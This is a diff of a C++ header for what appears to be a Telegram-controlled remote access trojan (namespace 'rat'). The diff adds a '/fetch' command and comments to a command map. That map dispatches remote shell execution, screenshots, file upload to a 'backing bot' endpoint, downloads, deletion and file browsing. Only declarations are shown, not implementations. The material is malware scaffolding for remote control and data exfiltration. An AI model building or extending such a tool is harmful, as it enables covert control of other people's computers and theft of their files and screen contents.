@@ -12,6 +12,9 @@
 #include <cstdint>
 #include <mutex>
 
+#define LS_COMMAND_LITERAL
+#define MV_COMMAND_LITERAL
+#define CP_COMMAND_LITERAL
 
 namespace rat::handler {
 
@@ -31,49 +34,68 @@ public:
     CurlClient_uPtr curl_client;
 
 private:
-    //the handler refrences the bot instead of owning it, they bot live inside the scope of the void botLoop(void) functions;
-    ThreadPool_uPtr process_pool;
-    ThreadPool_uPtr timer_pool;
-    
+    ThreadPool_uPtr long_process_pool;
+    ThreadPool_uPtr short_process_pool;
     
     std::mutex curl_client_mutex; 
     std::mutex backing_bot_mutex;
 
-    ::rat::handler::RatState state; //this is a refrence to a stack object;
-    /*since now we have a backing bot we can use its curl_client*/ 
+    ::rat::handler::RatState state;
 
     ::rat::tbot::Update* telegram_update;
     Command command;
 
     struct CommandHandler {
         std::string command;
-        void (Handler::*handler)();
+        void (Handler::*handler)(); //a function pointer to the handler method that actually executes the handling logic.
     };
     
-    const std::array<CommandHandler, 19> command_map = {{
+    const std::array<CommandHandler, 20> command_map = {{
+        //resets the internal state of the handler, by destroying the object this->state and reinstantiating it.
         {"/reset",        &Handler::handleResetCommand},
+        //takes a screenshot of the screen and sends, currently buggy since it does not delete the taken screenshot after upload;
         {"/screenshot",   &Handler::handleScreenshotCommand},
+        //drops the pending tasks for execution inside both the thread pools of the handler.
         {"/drop",         &Handler::handleDropCommand},
+        //executes a shell command as a seperate process entirely, with an unlimited timeout or a defined one.
         {"/process",      &Handler::parseAndHandleProcessCommand},
+        //prints the command that are dynamically in the this->state command command_map
         {"/menu",         &Handler::handleMenuCommand},
+        //downloads file using this->client_curl client;
         {"/download",     &Handler::handleDownloadCommand},
+        //uploads a file to a url using the same client;
         {"/upload",       &Handler::handleUploadCommand},
+        //prints the current working path;
         {"/pwd",          &Handler::handlePwdCommand},
+        //changes the current path;
         {"/cd",           &Handler::handleCdCommand},
+        //lists the current path;
         {"/ls",           &Handler::handleLsCommand},
+        //reads the content of the file
         {"/read",         &Handler::handleReadCommand},
+        //creates a file
         {"/touch",        &Handler::handleTouchCommand},
+        //uploads a file to the this->backing_bot endpoint;
         {"/get",          &Handler::handleGetCommand},
+        //gives the stat of the file
         {"/stat",         &Handler::handleStatCommand},
+        //removes the file or the dir dangerous
         {"/rm",           &Handler::handleRmCommand},
+        //similaor to unix mv
         {"/mv",           &Handler::handleMvCommand},
+        //copies the file or the dir
         {"/cp",           &Handler::handleCpCommand},
+        //supposedly sets the option in the bot or the state
         {"/set",          &Handler::handleSetCommand},
-        {"/help",         &Handler::handleHelpCommand}
+        //a help command;
+        {"/help",         &Handler::handleHelpCommand},
+        //fetches the path of a command adds it to the static command map inside this->state, this is supposed to define dynamic commands dependent on 
+        //the environnment of executes and add syntactic sugar over /process.
+        {"/fetch",        &Handler::handleFetchCommand}
     }};
-    
+    //The commands that execute with ! has their own dispatcher.
 
-  // Parse Telegram message to command
+  // Parse Telegram message to command, there is an attribute command that this method writes to, all the handlers and methods mutates the state of the class.
     void parseTelegramMessageToCommand(void);
     
   // Command handler methods
@@ -98,7 +120,7 @@ private:
     void handleMvCommand();
     void handleCpCommand();
     void handleSetCommand();
-
+    void handleFetchCommand();
     // Dispatchers - direct member function calls
     void dispatchIntegratedCommand();
 
@@ -118,7 +140,7 @@ public:
     void initMainBot(const char* arg_Token);
     void initBackingBot(const char* arg_Token);
     void initCurlClient(uint8_t Operation_Restart_Bound = 5);
-    void initThreadPools(uint8_t Number_Process_Threads = 1, uint8_t Number_Timer_Threads = 2);
+    void initThreadPools(uint8_t Number_Long_Process_Threads = 1, uint8_t Number_Short_Process_Threads = 2);
     // Handle Telegram update
     
     void handleUpdates();
